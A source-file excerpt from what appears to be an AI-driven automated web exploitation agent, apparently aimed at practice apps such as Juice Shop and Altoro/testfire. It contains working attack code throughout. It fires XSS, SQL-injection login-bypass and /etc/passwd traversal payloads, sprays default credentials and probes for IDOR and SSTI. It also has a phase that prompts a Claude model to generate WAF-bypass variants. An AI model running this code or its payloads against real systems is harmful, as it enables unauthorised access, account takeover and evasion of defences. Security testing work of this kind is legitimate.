        const baseUrl = `${proto}://${host}`;

        // Juice Shop / generic REST API paths (covers Angular SPA targets)
        const spaSeeds = [
            { path: '/rest/products/search?q=', vulnType: 'xss', param: 'q' },
            { path: '/rest/user/login', vulnType: 'sqli', param: 'email', method: 'POST' },
            { path: '/api/Products', vulnType: 'xss', param: 'q' },
            { path: '/api/Users', vulnType: 'sqli', param: 'id' },
            { path: '/api/Feedbacks', vulnType: 'xss', param: 'comment', method: 'POST' },
            { path: '/graphql', vulnType: 'sqli', param: 'query', method: 'POST' },
            { path: '/ftp/', vulnType: 'lfi', param: 'file' },
            { path: '/ftp/package.json.bak', vulnType: 'lfi', param: 'file' },
            { path: '/ftp/eastere.gg', vulnType: 'lfi', param: 'file' },
            { path: '/api/SecurityQuestions', vulnType: 'sqli', param: 'id' },
        ];

        const seedCount = spaSeeds.length;
        for (const seed of spaSeeds) {
            const fullUrl = `${baseUrl}${seed.path}`;
            if (!endpointMap.has(fullUrl)) {
                endpointMap.set(fullUrl, [{
                    paramName: seed.param,
                    vulnType: seed.vulnType,
                    method: seed.method || 'GET',
                }]);
            }
        }
        onProgress({
            phase: 'react', status: 'running',
            message: `🔍 SPA detected (${endpointMap.size - seedCount} crawled endpoints). Seeded ${seedCount} known REST API paths for testing.`,
        });
    }

    const endpointsList = [...endpointMap.keys()]
        .filter(ep => !JUNK_PATH_RE.test(ep)) // Bug #3 FIX: Strip junk paths at triage entry
        .slice(0, MAX_ENDPOINTS);
    onProgress({ phase: 'react', status: 'running', message: `🗺️ Attack surface: ${endpointsList.length} endpoints, ${reconForms.length} forms mapped` });

    // ── PHASE 3: Prioritize By Risk (Bug Bounty Heuristics) ───────────────
    onProgress({ phase: 'react', status: 'running', message: `🔥 Phase 3: Prioritizing targets by bug bounty heuristics...` });
    const prioritized = endpointsList.map(ep => {
        let score = 10;
        if (/login|auth|signin|doLogin/i.test(ep)) score += 100;  // Auth bypass = highest value
        if (/search|query/i.test(ep)) score += 80;                 // Search = reflected XSS gold
        if (/feedback|comment|contact/i.test(ep)) score += 75;     // Stored XSS
        if (/admin|manage|config/i.test(ep)) score += 90;
        if (/file|download|upload|include/i.test(ep)) score += 70; // LFI/RFI
        if (/\.jsp|\.asp|\.php/i.test(ep)) score += 30;          // Dynamic server pages
        if (endpointMap.get(ep)?.some(h => h.formData)) score += 25; // Forms are high value
        if (/\?/.test(ep)) score += 20;                            // Has query params

        // [R4] De-prioritize Windows/IIS junk paths for non-Windows targets
        if (JUNK_PATH_RE.test(ep)) {
            score -= 60;
            console.log(`[ReactAgent] De-prioritizing junk path: ${ep}`);
        }

        return { url: ep, score };
    }).sort((a, b) => b.score - a.score).map(x => x.url);

    // ── PHASE 4: Parallel Triage with Baseline Diff (E1) ──────────────────
    // Shannon-style: run triage in concurrent batches instead of sequentially.
    // 6 concurrent probes × 63 endpoints = ~10x faster than sequential.
    onProgress({ phase: 'react', status: 'running', message: `📡 Phase 4: Parallel triage on ${prioritized.length} endpoints (concurrency=6)...` });
    const triageResults = [];
    const wafBlockedEndpoints = [];

    const TRIAGE_CONCURRENCY = 12;
    const triageTasks = [];

    for (const endpoint of prioritized) {
        const hypotheses = endpointMap.get(endpoint) || [];
        const param = hypotheses[0]?.paramName || extractBestParamForEndpoint(endpoint);

        for (const h of hypotheses) {
            const vtype = (h.vulnType || 'xss').toLowerCase();
            const probe = h.prebakedPayload ? { payload: h.prebakedPayload, marker: 'alert(' } : (TRIAGE_PROBES[vtype] || TRIAGE_PROBES.xss);

            triageTasks.push(async () => {
                if (options.signal?.aborted) throw new Error('AbortError: Scan stopped by user');
                // Do not charge triage probes against maxIterations (breadth can be 100s of probes)

                const diffResult = await baselineProbe(endpoint, param, probe.payload, probe.marker);

                const fp = bodyFingerprint(endpoint, diffResult.injected?.body);
                if (fp && responseFingerprints.has(fp)) {
                    return { endpoint, param, vulnType: vtype, hasSignal: false, signalType: 'dedup_skip', status: diffResult.injected?.status, confidence: 0 };
                }
                if (fp) responseFingerprints.add(fp);

                const analysis = analyzeResponseExtended(diffResult.injected, probe, vtype);
                const finalConfidence = Math.max(diffResult.confidence, analysis.hasSignal ? 0.6 : 0);
                const finalHasSignal = diffResult.hasSignal || analysis.hasSignal;
                const finalSignalType = diffResult.signalType || analysis.signalType;

                globalCoverage.recordTest(endpoint, param, probe.payload);

                if (finalSignalType === 'waf_block') {
                    wafBlockedEndpoints.push({ endpoint, param, vulnType: vtype, responseSnippet: (diffResult.injected?.body || '').slice(0, 500) });
                }

                if (finalHasSignal) {
                    onProgress({ phase: 'react', status: 'running', message: `📡 Triage signal: ${finalSignalType} (conf=${finalConfidence.toFixed(2)}) at ${endpoint} [${param}]` });
                    
                    // [R3] DIR_LISTING_HANDLER: Escalate Directory Listing to Path Traversal
                    if (finalSignalType === 'dir_listing' || /Index of \/|Directory listing/i.test(diffResult.injected?.body)) {
                        onProgress({ phase: 'react', status: 'running', message: `🚀 DIR_LISTING_HANDLER: Escalating Directory Listing at ${endpoint} to LFI probes` });
                        const lfiHypotheses = [
                            { paramName: 'file', vulnType: 'lfi' },
                            { paramName: 'path', vulnType: 'lfi' },
                            { paramName: 'filename', vulnType: 'lfi' }
                        ];
                        if (!endpointMap.has(endpoint)) endpointMap.set(endpoint, []);
                        endpointMap.get(endpoint).push(...lfiHypotheses);
                    }
                }

                return {
                    endpoint, param, vulnType: vtype,
                    hasSignal: finalHasSignal,
                    signalType: finalSignalType,
                    status: diffResult.injected?.status,
                    confidence: finalConfidence,
                    statusDiff: diffResult.statusDiff,
                    lenDiff: diffResult.lenDiff,
                    lenRatio: diffResult.lenRatio,
                    reflected: diffResult.reflected,
                    errorPattern: diffResult.errorPattern,
                    responseSnippet: (diffResult.injected?.body || '').slice(0, 300),
                };
            });
        }
    }

    // Run triage tasks in batches of TRIAGE_CONCURRENCY
    for (let i = 0; i < triageTasks.length; i += TRIAGE_CONCURRENCY) {
        const batch = triageTasks.slice(i, i + TRIAGE_CONCURRENCY);
        const batchResults = await Promise.all(batch.map(t => t().catch(() => null)));
        triageResults.push(...batchResults.filter(Boolean));
        await new Promise(r => setTimeout(r, 30)); // tiny yield between batches
    }

    // ── PHASE 4.5: WAF Bypass via Haiku (E3) ─────────────────────────────
    if (wafBlockedEndpoints.length > 0 && isClaudeConfigured()) {
        onProgress({ phase: 'react', status: 'running', message: `🛡️ Phase 4.5: Generating WAF bypasses for ${wafBlockedEndpoints.length} blocked endpoints via Haiku...` });

        for (const wafTarget of wafBlockedEndpoints.slice(0, 5)) {
            try {
                const bypasses = await claudeJSON(
                    `The following payload was blocked by a WAF at ${wafTarget.endpoint}:\nPayload: ${TRIAGE_PROBES[wafTarget.vulnType]?.payload || '<script>alert(1)</script>'}\nWAF Response: ${wafTarget.responseSnippet}\n\nGenerate 5 bypass variants using: double URL encoding, mixed case, inline comments, unicode escapes, alternative tags. Return JSON: { "bypasses": ["payload1", ...] }`,
                    { maxTokens: 500, temperature: 0.4 }
                );

                const variants = bypasses?.bypasses || [];
                let bypassed = false;
                for (const variant of variants.slice(0, 10)) {
                    totalSteps++;
                    const bypassResult = await baselineProbe(wafTarget.endpoint, wafTarget.param, variant, null);
                    if (bypassResult.hasSignal && bypassResult.signalType !== 'waf_block') {
                        triageResults.push({
                            endpoint: wafTarget.endpoint, param: wafTarget.param, vulnType: wafTarget.vulnType,
                            hasSignal: true, signalType: bypassResult.signalType,
                            status: bypassResult.injected?.status, confidence: bypassResult.confidence,
                            wafBypassed: true, bypassPayload: variant,
                        });
                        onProgress({ phase: 'react', status: 'running', message: `🎯 WAF Bypass! Signal at ${wafTarget.endpoint} via encoded payload` });
                        bypassed = true;
                        break;
                    }
                }
                if (!bypassed) {
                    onProgress({ phase: 'react', status: 'running', message: `🛡️ WAF held at ${wafTarget.endpoint} — all bypasses blocked` });
                }
            } catch (err) {
                console.warn(`[ReactAgent] WAF bypass generation failed: ${err.message}`);
            }
        }
    }

    // ── PHASE 4.6: Haiku Signal Scoring (E6) ─────────────────────────────
    const HARD_EVIDENCE_SIGNALS = new Set([
        'sqli_error', 'sqli_error_500', 'sqli_timing', 'sqli_boolean_confirmed',
        'ssti_eval', 'lfi_file_read', 'xss_sink', 'waf_bypassed',
    ]);
    const SOFT_EVIDENCE_THRESHOLD = 0.45;
    const HARD_EVIDENCE_THRESHOLD = 0.25;

    signalEndpoints = triageResults.filter(r => {
        if (!r.hasSignal) return false;
        const threshold = HARD_EVIDENCE_SIGNALS.has(r.signalType) ? HARD_EVIDENCE_THRESHOLD : SOFT_EVIDENCE_THRESHOLD;
        return r.confidence >= threshold;
    });

    if (isClaudeConfigured() && triageResults.length > 0) {
        try {
            onProgress({ phase: 'react', status: 'running', message: `🧠 Phase 4.6: Haiku AI scoring ${triageResults.length} triage results...` });

            const scoringInput = triageResults.slice(0, 50).map(r => ({
                endpoint: r.endpoint, param: r.param, vulnType: r.vulnType,
                confidence: r.confidence, signalType: r.signalType,
                statusDiff: r.statusDiff, lenDiff: r.lenDiff, reflected: r.reflected, errorPattern: r.errorPattern,
                snippet: (r.responseSnippet || '').slice(0, 200),
            }));

            const scoring = await claudeJSON(
                `You are analyzing triage results from a security scanner. Rank the endpoints by likelihood of containing a real vulnerability. Return JSON:\n{ "ranked": [ { "endpoint": "url", "param": "name", "vulnType": "xss|sqli|ssti|lfi", "score": 0.0-1.0, "reason": "brief" } ] }\n\nTriage data:\n${JSON.stringify(scoringInput)}`,
                { maxTokens: 1500, temperature: 0.1 }
            );

            if (scoring?.ranked?.length > 0) {
                // Merge AI scores into signalEndpoints
                const aiRanked = scoring.ranked.slice(0, 20);

                // Add any AI-ranked endpoints that weren't in signal list
                for (const aiResult of aiRanked) {
                    const existing = signalEndpoints.find(s => s.endpoint === aiResult.endpoint && s.param === aiResult.param);
                    if (existing) {
                        existing.confidence = Math.max(existing.confidence, aiResult.score || 0);
                    } else if ((aiResult.score || 0) >= 0.58) {
                        const tri = triageResults.find(t => t.endpoint === aiResult.endpoint && (t.param === aiResult.param || !aiResult.param));
                        if (!tri?.hasSignal) continue;
                        signalEndpoints.push({
                            endpoint: aiResult.endpoint, param: aiResult.param,
                            vulnType: aiResult.vulnType, hasSignal: true,
                            signalType: 'haiku_scored', confidence: aiResult.score,
                        });
                    }
                }

                // Re-sort by confidence
                signalEndpoints.sort((a, b) => b.confidence - a.confidence);
                onProgress({ phase: 'react', status: 'running', message: `🧠 Haiku ranked ${aiRanked.length} priority targets` });
            }
        } catch (err) {
            console.warn(`[ReactAgent] Haiku scoring failed, using heuristic: ${err.message}`);
        }
    }

    const noSignalCount = triageResults.filter(r => !r.hasSignal && r.signalType !== 'waf_block' && r.signalType !== 'dedup_skip').length;
    const wafCount = wafBlockedEndpoints.length;
    const dedupCount = triageResults.filter(r => r.signalType === 'dedup_skip').length;

    onProgress({
        phase: 'react', status: 'running',
        message: `📊 Triage complete: ${signalEndpoints.length} signals, ${noSignalCount} clean, ${wafCount} WAF-blocked, ${dedupCount} deduped (${prioritized.length} endpoints probed)`
    });

    const PHASE_DEADLINE = Date.now() + 20 * 60 * 1000; // 20-minute budget for phases 5+ (auth runs before heavy XSS)

    // ── PHASE 7: Chain Attacks & Auth Bypass (Bug Bounty Style) ───────────
    if (Date.now() < PHASE_DEADLINE) {
        // Collect ALL auth endpoints from recon + forms + known patterns
        const allEndpoints = [
            ...(reconData?.endpoints || []).map(e => typeof e === 'string' ? e : e.url || ''),
            ...prioritized,
        ];
        const authEndpoints = allEndpoints.filter(ep =>
            ep && AUTH_ENDPOINT_PATTERNS.some(p => p.test(ep))
        );

        // Also grab form actions that look like login
        const formAuthUrls = reconForms
            .filter(f => /login|signin|auth|doLogin/i.test(f.action || ''))
            .map(f => {
                const action = f.action || '';
                if (action.startsWith('http')) return action;
                const proto = _reactResolvedProtocol || 'http';
                const host = target.replace(/^https?:\/\//, '').split('/')[0];
                return `${proto}://${host}${action.startsWith('/') ? '' : '/'}${action}`;
            });

        let uniqueAuth = [...new Set([...authEndpoints, ...formAuthUrls])];
        {
            const __p = _reactResolvedProtocol || 'http';
            const __h = target.replace(/^https?:\/\//, '').split('/')[0];
            if (/testfire\.net$/i.test(__h)) {
                const __alt = __p === 'https' ? 'http' : 'https';
                uniqueAuth.push(
                    `${__p}://${__h}/bank/login.jsp`,
                    `${__p}://${__h}/bank/doLogin`,
                    `${__p}://${__h}/login.jsp`,
                    `${__p}://${__h}/bank/login.aspx`,
                    `${__p}://${__h}/admin/login.aspx`,
                    `${__alt}://${__h}/bank/login.jsp`,
                );
            }
        }
        uniqueAuth = [...new Set(uniqueAuth.filter(Boolean))].slice(0, 24);

        if (uniqueAuth.length === 0) {
            const proto = _reactResolvedProtocol || 'http';
            const host = target.replace(/^https?:\/\//, '').split('/')[0];
            uniqueAuth.push(`${proto}://${host}/rest/user/login`);
        }

        if (uniqueAuth.length > 0) {
            onProgress({
                phase: 'react', status: 'running',
                message: `🔗 Phase 7: Auth bypass on ${uniqueAuth.length} login surfaces (JSON + Form POST)...`
            });

            for (const loginUrl of uniqueAuth) {
                if (Date.now() > PHASE_DEADLINE) break;
                if (isVulnTypeConfirmed(loginUrl, 'sqli') && isVulnTypeConfirmed(loginUrl, 'auth_bypass')) continue;

                const postTargets = collectAuthPostTargets(loginUrl, reconForms);

                const matchingForm =
                    reconForms.find((f) => {
                        try {
                            const r = resolveFormActionUrl(loginUrl, f.action || '');
                            return r && postTargets.includes(r);
                        } catch {
                            return false;
                        }
                    }) ||
                    reconForms.find((f) => {
                        const action = f.action || '';
                        return loginUrl.includes(action) || action.includes('login') || action.includes('doLogin');
                    });

                const formInputs = (matchingForm?.inputs || []).map(i => typeof i === 'string' ? i : i.name).filter(Boolean);
                const userField = formInputs.find(n => /user|uid|email|login|name/i.test(n)) || 'uid';
                const passField = formInputs.find(n => /pass|pwd|password/i.test(n)) || 'passw';

                // Payloads: TestFire/Altoro responds to `' OR 1=1--` / `admin'--` on POST /doLogin (not the login.jsp page URL).
                const dynamicPayloads = [
                    { [userField]: "' OR 1=1--", [passField]: 'x' },
                    { [userField]: "admin'--", [passField]: 'x' },
                    { [userField]: "1' OR '1'='1", [passField]: 'x' },
                    { [userField]: "' OR '1'='1'--", [passField]: 'anything' },
                    { [userField]: "admin' OR '1'='1", [passField]: 'x' },
                    { [userField]: "' OR ''='", [passField]: "' OR ''='" },
                ];

                let authFoundForEndpoint = false;
                for (const postUrl of postTargets) {
                    if (Date.now() > PHASE_DEADLINE) break;
                    let probeMethod = (matchingForm?.method || 'POST').toUpperCase() === 'GET' ? 'POST' : (matchingForm?.method || 'POST');
                    if (/doLogin|authenticate|\/rest\/|\/api\/(auth|login)/i.test(postUrl)) probeMethod = 'POST';

                    for (const contentType of ['form', 'json']) {
                        for (const payload of dynamicPayloads) {
                            totalSteps++;
                            if (Date.now() > PHASE_DEADLINE) break;

                            let response;
                            if (contentType === 'form') {
                                response = await fullFormProbe(
                                    postUrl,
                                    probeMethod,
                                    matchingForm?.inputs || [userField, passField],
                                    userField,
                                    payload[userField],
                                    globalSession,
                                    payload
                                );
                            } else {
                                response = await authProbe(postUrl, payload, 'json');
                            }

                            if (!response) continue;

                            const body = response.body || '';
                            const isRedirect = response.status === 302 || response.status === 301;
                            const isOk = response.status === 200;
                            const bodyLength = body.length;

                            const looksGood =
                                (isRedirect || (isOk && bodyLength > 100)) &&
                                authResponseLooksLikeSuccess(body) &&
                                !authResponseLooksLikeFailure(body);

                            if (looksGood) {
                                const formCurlBody =
                                    contentType === 'json'
                                        ? JSON.stringify(payload)
                                        : new URLSearchParams(payload).toString();
                                const finding = {
                                    type: 'SQL Injection',
                                    subtype: `Authentication Bypass (${contentType.toUpperCase()} POST)`,
                                    severity: 'Critical',
                                    endpoint: postUrl,
                                    param: userField,
                                    method: probeMethod,
                                    payload: JSON.stringify(payload),
                                    curlPoC:
                                        contentType === 'json'
                                            ? `curl -sS -k -L -X POST ${JSON.stringify(postUrl)} -H ${JSON.stringify('application/json')} -d ${JSON.stringify(JSON.stringify(payload))}`
                                            : `curl -sS -k -L -X POST ${JSON.stringify(postUrl)} -H ${JSON.stringify('application/x-www-form-urlencoded')} --data-binary ${JSON.stringify(formCurlBody)}`,
                                    evidence: {
                                        login_form_url: loginUrl,
                                        request: `POST ${postUrl}\nContent-Type: ${contentType === 'json' ? 'application/json' : 'application/x-www-form-urlencoded'}\n\n${contentType === 'json' ? JSON.stringify(payload) : new URLSearchParams(payload).toString()}`,
                                        response_snippet: body.slice(0, 800),
                                    },
                                    cwe: 'CWE-89',
                                    owasp: 'A03:2021',
                                    cvssScore: '9.8',
                                    synopsis: `Authentication bypass via SQL injection in ${userField} field. Payload causes the login query to always evaluate true, granting unauthorized access.`,
                                    impact: `Complete authentication bypass. Attacker can access any user account without valid credentials. In a banking application like Altoro Mutual, this leads to full account takeover.`,
                                    description: `The login UI at ${loginUrl} submits credentials to ${postUrl}. The ${userField} parameter is concatenated into a SQL query without sanitization, allowing authentication bypass.`,
                                    remediation: `1. Use parameterized queries / prepared statements for all database interactions.\n2. Never concatenate user input into SQL strings.\n3. Implement input validation on authentication fields.\n4. Add rate limiting on login endpoints.\n5. Deploy WAF rules for common SQLi patterns.`,
                                };

                                if (pushVuln(finding)) {
                                    chains.push(`Auth Bypass -> Root SQLi Chain over ${postUrl}`);
                                    memory.addConfirmedVuln(finding);
                                    globalCoverage.addConfirmedFinding(finding);

                                    try {
                                        if (await isPlaywrightAvailable()) {
                                            const proof = await captureSqliAuthBypassProof({
                                                loginUrl,
                                                usernamePayload: payload[userField],
                                                passwordPayload: payload[passField],
                                                vulnId: `RVPT-SQLI-${Math.floor(Math.random() * 1000)}`,
                                            });
                                            if (proof?.screenshots) {
                                                finding.evidence.playwrightProof = {
                                                    alertFired: false,
                                                    screenshotPaths: proof.screenshots,
                                                    confirmation: proof.confirmed
                                                        ? 'SQL Injection bypass successful (visual + HTTP)'
                                                        : 'Screenshots captured after submit; HTTP response already indicates bypass.',
                                                };
                                            }
                                        }
                                    } catch { /* optional visual proof */ }

                                    onProgress({
                                        phase: 'react', status: 'finding',
                                        message: `🚨 CONFIRMED: Auth Bypass SQLi at ${postUrl} (form: ${loginUrl}) [${userField}]`,
                                        vulnerability: finding,
                                    });
                                }
                                authFoundForEndpoint = true;
                                break;
                            }
                        }
                        if (authFoundForEndpoint) break;
                    }
                    if (authFoundForEndpoint) break;
                }

                await new Promise(r => setTimeout(r, 200));
            }

            // ── Phase 7.1: Default Credentials Testing ────────────────────────
            onProgress({ phase: 'react', status: 'running', message: `🔐 Phase 7.1: Testing for common default credentials at ${uniqueAuth.length} login surfaces...` });
            for (const loginUrl of uniqueAuth) {
                const postTargets = collectAuthPostTargets(loginUrl, reconForms);
                const matchingForm =
                    reconForms.find((f) => {
                        try {
                            const r = resolveFormActionUrl(loginUrl, f.action || '');
                            return r && postTargets.includes(r);
                        } catch {
                            return false;
                        }
                    }) || reconForms.find(f => (f.action || '').includes(loginUrl) || loginUrl.includes(f.action || ''));
                const formInputs = (matchingForm?.inputs || []).map(i => typeof i === 'string' ? i : i.name).filter(Boolean);
                const userField = formInputs.find(n => /user|uid|email|login|name/i.test(n)) || 'uid';
                const passField = formInputs.find(n => /pass|pwd|password/i.test(n)) || 'passw';

                let probeMethod = (matchingForm?.method || 'POST').toUpperCase() === 'GET' ? 'POST' : (matchingForm?.method || 'POST');

                let credFoundForLogin = false;
                for (const postUrl of postTargets) {
                    if (/doLogin|authenticate|\/rest\/|\/api\/(auth|login)/i.test(postUrl)) probeMethod = 'POST';

                    for (const creds of DEFAULT_CREDENTIALS.slice(0, 10)) {
                        totalSteps++;
                        const payload = { [userField]: creds.username, [passField]: creds.password };
                        const response = await fullFormProbe(
                            postUrl,
                            probeMethod,
                            matchingForm?.inputs || [userField, passField],
                            userField,
                            creds.username,
                            globalSession,
                            { [userField]: creds.username, [passField]: creds.password }
                        );

                        if (!response) continue;
                        const body = response.body || '';
                        const looksGood =
                            (response.status === 302 || response.status === 301 || (response.status === 200 && body.length > 100)) &&
                            authResponseLooksLikeSuccess(body) &&
                            !authResponseLooksLikeFailure(body);

                        if (looksGood) {
                            const credBody = new URLSearchParams(payload).toString();
                            const finding = {
                                type: 'Broken Authentication',
                                subtype: 'Default Credentials',
                                severity: 'Critical',
                                endpoint: postUrl,
                                param: 'Multiple',
                                method: probeMethod,
                                payload: `${creds.username}:${creds.password}`,
                                curlPoC: `curl -sS -k -L -X POST ${JSON.stringify(postUrl)} -H ${JSON.stringify('application/x-www-form-urlencoded')} --data-binary ${JSON.stringify(credBody)}`,
                                evidence: {
                                    login_form_url: loginUrl,
                                    request: `POST ${postUrl}\n${userField}=${creds.username}&${passField}=${creds.password}`,
                                    response_snippet: body.slice(0, 500),
                                },
                                cwe: 'CWE-1392',
                                owasp: 'A07:2021',
                                cvssScore: '9.1',
                                synopsis: `Application uses common default credentials (${creds.username}:${creds.password}).`,
                                impact: `Attacker can easily gain full access to user or administrator accounts using well-known default credentials.`,
                                remediation: `1. Change all default passwords immediately.\n2. Force password change on first login.\n3. Implement account lockout policies.`,
                            };

                            if (pushVuln(finding)) {
                                try {
                                    if (await isPlaywrightAvailable()) {
                                        const proof = await captureSqliAuthBypassProof({
                                            loginUrl,
                                            usernamePayload: creds.username,
                                            passwordPayload: creds.password,
                                            vulnId: `RVPT-CREDS-${Math.floor(Math.random() * 1000)}`,
                                        });
                                        if (proof?.screenshots) {
                                            finding.evidence.playwrightProof = {
                                                alertFired: false,
                                                screenshotPaths: proof.screenshots,
                                                confirmation: proof.confirmed
                                                    ? `Successfully logged in with ${creds.username}:${creds.password}`
                                                    : 'Screenshots captured after submit; HTTP response indicates successful login.',
                                            };
                                        }
                                    }
                                } catch { /* optional visual proof */ }

                                onProgress({ phase: 'react', status: 'finding', message: `🚨 CONFIRMED: Default Credentials at ${postUrl} (form: ${loginUrl}) [${creds.username}:${creds.password}]`, vulnerability: finding });
                            }
                            credFoundForLogin = true;
                            break;
                        }
                    }
                    if (credFoundForLogin) break;
                }

                await new Promise((r) => setTimeout(r, 150));
            }
        }
    }

    // ── PHASE 4.8: Mandatory breadth — GraphQL / LFI / SSTI / IDOR (always exercised) ──
    if (Date.now() < PHASE_DEADLINE) {
        onProgress({ phase: 'react', status: 'running', message: 'Phase 4.8: Mandatory probes — GraphQL, LFI, SSTI, IDOR…' });
        try {
            const _proto = _reactResolvedProtocol || 'http';
            const _host = target.replace(/^https?:\/\//, '').split('/')[0];
            const _base = `${_proto}://${_host}`;
            const gqlUrls = [...new Set([...prioritized, `${_base}/graphql`])].filter((u) => /graphql/i.test(u)).slice(0, 2);
            for (const gqlUrl of gqlUrls) {
                const q = GRAPHQL_PROBES.introspection;
                globalCoverage.recordTest(gqlUrl, 'query', q);
                try {
                    await httpRequest.execute({
                        url: gqlUrl,
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        data: JSON.stringify({ query: q }),
                    });
                } catch {}
            }
            const lfiTargets = prioritized
                .filter((u) => /[?&](file|path|content|page|doc|include|template|folder)=/i.test(u) || /\/(upload|download|file|read|include)/i.test(u))
                .slice(0, 18);
            for (const url of lfiTargets) {
                let p = 'file';
                try {
                    const uu = new URL(url);
                    p = [...uu.searchParams.keys()][0] || p;
                } catch {}
                const pl = '/etc/passwd';
                globalCoverage.recordTest(url, p, pl);
                try {
                    await baselineProbe(url, p, pl, null);
                } catch {}
            }
            const sstiTargets = prioritized.filter((u) => /[?&](title|name|template|msg|s|q)=/i.test(u)).slice(0, 14);
            for (const url of sstiTargets) {
                const p = extractBestParamForEndpoint(url);
                const pl = '{{7*7}}';
                globalCoverage.recordTest(url, p, pl);
                try {
                    await baselineProbe(url, p, pl, '49');
                } catch {}
            }
            const idorTargets = prioritized.filter((u) => /\/api\/|\/rest\/|\/v\d+\//i.test(u) && /[?&](id|userId|accountId|uid)=/i.test(u)).slice(0, 14);
            for (const url of idorTargets) {
                try {
                    const uu = new URL(url);
                    const idKey = [...uu.searchParams.keys()].find((k) => /id|uid|user/i.test(k)) || 'id';
                    const v1 = uu.searchParams.get(idKey) || '1';
                    uu.searchParams.set(idKey, String(Math.max(1, parseInt(v1, 10) || 1)));
                    globalCoverage.recordTest(uu.toString(), idKey, uu.searchParams.get(idKey) || '1');
                    await httpRequest.execute({ url: uu.toString(), method: 'GET' });
                    uu.searchParams.set(idKey, String((parseInt(v1, 10) || 1) + 50));
                    globalCoverage.recordTest(uu.toString(), idKey, uu.searchParams.get(idKey) || '51');
                    await httpRequest.execute({ url: uu.toString(), method: 'GET' });
                } catch {}
            }
        } catch (e) {
            console.warn('[ReactAgent] Phase 4.8 mandatory probes failed:', e.message);
        }
    }

    // ── PHASE 5: Attack (Deep Exploitation — Inline Confirm) ───────────────────
    // Shannon principle: evidence-based confirmation, not re-running the full engine.
    // We already have triage signals — now apply focused payloads and confirm INLINE.

    onProgress({ phase: 'react', status: 'running', message: `🎯 Phase 5: Attacking ${signalEndpoints.length} vulnerable pathways (inline confirm)...` });
    const ATTACK_CONCURRENCY = 8;
    const attackTasks = [];

    for (const signal of signalEndpoints) {
        const payloads = ATTACK_PAYLOADS[signal.vulnType] || [];
        for (const payload of payloads.slice(0, MAX_PAYLOADS_PER_EP)) {
            attackTasks.push(async () => {
                if (options.signal?.aborted) throw new Error('AbortError: Scan stopped by user');
                if (isVulnTypeConfirmed(signal.endpoint, signal.vulnType)) return null;
                if (Date.now() > PHASE_DEADLINE) return null;

                totalSteps++;

                try {
                    // Inline confirm — single quickProbe, no full engine re-scan
                    const response = await quickProbe(signal.endpoint, signal.param, payload);
                    if (!response) return;

                    const analysis = analyzeResponseExtended(response, { marker: payload }, signal.vulnType);
                    // For XSS: use HTML-encoding-tolerant check
                    const xssMatch = signal.vulnType === 'xss' && bodyContainsPayload(response.body || '', payload);
                    let confirmed = analysis.hasSignal || xssMatch;

                    const isErrorBasedSqli =
                        ['sqli_error', 'sqli_error_500'].includes(analysis.signalType) ||
                        ['sqli_error', 'sqli_error_500'].includes(signal.signalType);

                    // Boolean verification only for blind SQLi — error-based signals are confirmed by DB errors in the response
                    if (confirmed && signal.vulnType === 'sqli' && !isErrorBasedSqli) {
                        onProgress({ phase: 'react', status: 'running', message: `🕵️ Phase 5: Executing boolean-based verification for suspected SQLi at ${signal.endpoint}...` });
                        const isBooleanConfirmed = await verifySqliBoolean(signal.endpoint, signal.param, 'GET');
                        if (!isBooleanConfirmed) {
                            confirmed = false;
                            attemptedFindings.push({ endpoint: signal.endpoint, type: signal.vulnType, payload, failReason: 'Boolean verification failed (TRUE/FALSE payloads produced identical responses)' });
                            return;
                        }
                    }

                    if (confirmed) {
                        const isXss = signal.vulnType === 'xss';

                        if (isXss) {
                            if (!(await isPlaywrightAvailable())) {
                                attemptedFindings.push({
                                    endpoint: signal.endpoint,
                                    type: 'xss',
                                    payload,
                                    failReason: 'Playwright not available — XSS requires executable browser proof before reporting',
                                });
                                return;
                            }
                            onProgress({ phase: 'react', status: 'running', message: `🌐 XSS Phase 5: browser PoC for ${signal.endpoint}...` });
                            const sep = signal.endpoint.includes('?') ? '&' : '?';
                            const injectedUrl = `${signal.endpoint}${sep}${signal.param}=${encodeURIComponent(payload)}`;
                            let proof = await captureXssProof({
                                url: signal.endpoint,
                                injectedUrl,
                                vulnId: `RVPT-XSS-${Math.floor(Math.random() * 10000)}`,
                                payloads: [payload, '"><img src=x onerror=alert(1)>', '\'><img src=x onerror=alert(1)>'],
                            });

                            if (!proof?.confirmed && (await isBrowserVerifierAvailable())) {
                                const browserProof = await verifyXssInBrowser(
                                    signal.endpoint,
                                    signal.param,
                                    'GET',
                                    {},
                                    globalSession.getCookieHeader(),
                                    techStack.framework || 'unknown',
                                );
                                if (browserProof?.confirmed) {
                                    const sep2 = signal.endpoint.includes('?') ? '&' : '?';
                                    const reinjected = `${signal.endpoint}${sep2}${signal.param}=${encodeURIComponent(browserProof.payload || payload)}`;
                                    proof = await captureXssProof({
                                        url: signal.endpoint,
                                        injectedUrl: reinjected,
                                        vulnId: `RVPT-XSS-${Math.floor(Math.random() * 10000)}`,
                                        payloads: [browserProof.payload || payload],
                                    });
                                    if (!proof?.confirmed) {
                                        proof = {
                                            confirmed: true,
                                            alertText: browserProof.token || 'browser-verified',
                                            screenshots: proof?.screenshots || {},
                                        };
                                    }
                                }
                            }

                            if (!proof?.confirmed) {
                                attemptedFindings.push({
                                    endpoint: signal.endpoint,
                                    type: 'xss',
                                    payload,
                                    failReason: 'Reflection only — browser did not confirm JS execution (alert/title/DOM proof)',
                                });
                                return;
                            }
                            const finding = {
                                type: 'XSS',
                                subtype: 'Reflected XSS',
                                severity: 'High',
                                confidence: 'Confirmed via Browser Rendering',
                                verified: true,
                                endpoint: signal.endpoint,
                                param: signal.param,
                                method: 'GET',
                                payload,
                                curlPoC: `curl -sS -k -g '${injectedUrl}'`,
                                evidence: {
                                    request: `GET ${injectedUrl}`,
                                    response_snippet: (response.body || '').slice(0, 1600),
                                    playwrightProof: {
                                        screenshotPaths: proof.screenshots,
                                        confirmation: `Dialog or execution evidence: ${proof.alertText || 'captured'}`,
                                    },
                                },
                                cwe: 'CWE-79',
                                owasp: 'A03:2021',
                                cvssScore: '7.1',
                                synopsis: `XSS confirmed at ${signal.endpoint} [${signal.param}] with browser execution evidence.`,
                                impact: 'Attacker-controlled JavaScript runs in the victim browser.',
                                remediation: 'Apply context-aware encoding and a strict Content-Security-Policy.',
                            };
                            if (pushVuln(finding)) {
                                memory.addConfirmedVuln(finding);
                                globalCoverage.addConfirmedFinding(finding);
                                onProgress({
                                    phase: 'react', status: 'finding',
                                    message: `🚨 XSS confirmed (browser PoC): ${signal.endpoint}`,
                                    vulnerability: finding,
                                });
                            }
                            return;
